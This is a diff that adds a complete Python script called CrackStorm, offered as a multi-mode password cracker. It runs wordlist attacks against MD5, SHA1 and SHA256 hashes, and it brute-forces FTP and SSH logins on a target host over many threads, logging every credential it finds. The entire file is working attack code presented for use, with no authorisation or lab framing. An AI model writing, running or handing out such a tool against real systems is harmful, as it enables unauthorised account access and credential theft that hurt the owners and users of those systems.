@@ -1,0 +1,187 @@
+#!/usr/bin/env python3
+import argparse
+import hashlib
+import threading
+import queue
+import logging
+import os
+import paramiko
+from ftplib import FTP
+import sys
+
+# Setup logs
+os.makedirs("logs", exist_ok=True)
+logging.basicConfig(filename="logs/log.txt", level=logging.INFO, format="%(asctime)s - %(message)s")
+paramiko.util.log_to_file("logs/paramiko.log")
+
+# Thread queue
+combo_queue = queue.Queue()
+
+# ANSI Colors
+GREEN = "\033[1;32m"
+RED = "\033[1;31m"
+RESET = "\033[0m"
+
+# Banner
+def print_banner():
+    banner = f"""{GREEN}
+  ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗
+ ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║
+ ██║     ██████╔╝███████║██║     █████╔╝ █████╗     ██║   ██║   ██║██████╔╝██╔████╔██║
+ ██║     ██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║   ██║   ██║██╔═══╝ ██║╚██╔╝██║
+ ╚██████╗██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║   ╚██████╔╝██║     ██║ ╚═╝ ██║
+  ╚═════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝     ╚═╝
+                         CrackStorm v1.0 by Jibin Kurian
+{RESET}"""
+    print(banner)
+
+# ------------------ HASH CRACKER ------------------ #
+def hash_crack(hash_value, hash_type, wordlist):
+    hash_type = hash_type.lower()
+    try:
+        with open(wordlist, 'r', errors="ignore") as f:
+            for line in f:
+                word = line.strip()
+                if hash_type == 'md5':
+                    hashed = hashlib.md5(word.encode()).hexdigest()
+                elif hash_type == 'sha1':
+                    hashed = hashlib.sha1(word.encode()).hexdigest()
+                elif hash_type == 'sha256':
+                    hashed = hashlib.sha256(word.encode()).hexdigest()
+                else:
+                    print(f"{RED}[!] Unsupported hash type.{RESET}")
+                    return
+                logging.info(f"Trying: {word}")
+                if hashed == hash_value:
+                    print(f"{GREEN}[✓] Access Granted! Password is: {word}{RESET}")
+                    logging.info(f"Cracked Hash: {word}")
+                    return
+        print(f"{RED}[-] Access Denied! No password match found.{RESET}")
+    except FileNotFoundError:
+        print(f"{RED}[!] Wordlist file not found.{RESET}")
+
+# ------------------ FTP LOGIN ATTACK ------------------ #
+def ftp_login_worker(host, username, password):
+    try:
+        ftp = FTP(host, timeout=5)
+        ftp.login(username, password)
+        print(f"{GREEN}[✓] FTP Success: {username}:{password}{RESET}")
+        logging.info(f"FTP Success: {username}:{password}")
+        ftp.quit()
+    except:
+        pass
+
+# ------------------ SSH LOGIN ATTACK ------------------ #
+def ssh_login_worker(host, username, password):
+    try:
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.connect(host, username=username, password=password, timeout=5)
+        print(f"{GREEN}[✓] SSH Success: {username}:{password}{RESET}")
+        logging.info(f"SSH Success: {username}:{password}")
+        client.close()
+    except:
+        pass
+
+# ------------------ PROTOCOL CRACKER ------------------ #
+def protocol_cracker(mode, host, userlist, passlist, threads):
+    try:
+        usernames = open(userlist, 'r').read().splitlines()
+        passwords = open(passlist, 'r').read().splitlines()
+    except FileNotFoundError:
+        print(f"{RED}[!] Username or Password file not found.{RESET}")
+        return
+
+    for u in usernames:
+        for p in passwords:
+            combo_queue.put((u.strip(), p.strip()))
+
+    def worker():
+        while not combo_queue.empty():
+            try:
+                uname, passwd = combo_queue.get_nowait()
+                if mode == 'ftp':
+                    ftp_login_worker(host, uname, passwd)
+                elif mode == 'ssh':
+                    ssh_login_worker(host, uname, passwd)
+                combo_queue.task_done()
+            except queue.Empty:
+                break
+
+    thread_list = []
+    for _ in range(threads):
+        t = threading.Thread(target=worker)
+        t.start()
+        thread_list.append(t)
+
+    for t in thread_list:
+        t.join()
+
+# ------------------ INTERACTIVE MODE ------------------ #
+def interactive_mode():
+    print_banner()
+    print("Welcome to CrackStorm v1.0 🔐")
+    print("Select mode:")
+    print("  [1] Hash Cracking")
+    print("  [2] FTP Login Brute-force")
+    print("  [3] SSH Login Brute-force")
+    print("  [0] Exit")
+
+    choice = input(">>> ")
+
+    if choice == "1":
+        h = input("Enter hash: ")
+        t = input("Hash type (md5/sha1/sha256): ")
+        w = input("Path to wordlist: ")
+        hash_crack(h, t, w)
+    elif choice == "2":
+        host = input("Target IP/Host: ")
+        u = input("Path to userlist: ")
+        p = input("Path to passlist: ")
+        threads = int(input("Threads (default 5): ") or 5)
+        protocol_cracker("ftp", host, u, p, threads)
+    elif choice == "3":
+        host = input("Target IP/Host: ")
+        u = input("Path to userlist: ")
+        p = input("Path to passlist: ")
+        threads = int(input("Threads (default 5): ") or 5)
+        protocol_cracker("ssh", host, u, p, threads)
+    else:
+        print("Exiting...")
+
+# ------------------ MAIN ------------------ #
+def main():
+    print_banner()
+
+    parser = argparse.ArgumentParser(description="CrackStorm – A Multi-Mode Password Cracker by Jibin")
+    parser.add_argument("--mode", choices=['hash', 'ftp', 'ssh'], help="Mode: hash / ftp / ssh")
+    parser.add_argument("--hash", help="Hash to crack")
+    parser.add_argument("--type", help="Hash type: md5 / sha1 / sha256")
+    parser.add_argument("--wordlist", help="Wordlist file for hash cracking")
+    parser.add_argument("--host", help="Target IP/Hostname for FTP/SSH")
+    parser.add_argument("--userlist", help="Username wordlist file")
+    parser.add_argument("--passlist", help="Password wordlist file")
+    parser.add_argument("--threads", type=int, default=5, help="Number of threads (default: 5)")
+
+    if len(sys.argv) == 1:
+        interactive_mode()
+        sys.exit(0)
+
+    args = parser.parse_args()
+
+    if args.mode == "hash":
+        if not args.hash or not args.type or not args.wordlist:
+            print(f"{RED}[!] Missing arguments for hash mode.{RESET}")
+            parser.print_help()
+            sys.exit(1)
+        hash_crack(args.hash, args.type, args.wordlist)
+
+    elif args.mode in ["ftp", "ssh"]:
+        if not args.host or not args.userlist or not args.passlist:
+            print(f"{RED}[!] Missing arguments for protocol mode.{RESET}")
+            parser.print_help()
+            sys.exit(1)
+        protocol_cracker(args.mode, args.host, args.userlist, args.passlist, args.threads)
+
+if __name__ == "__main__":
+    main()
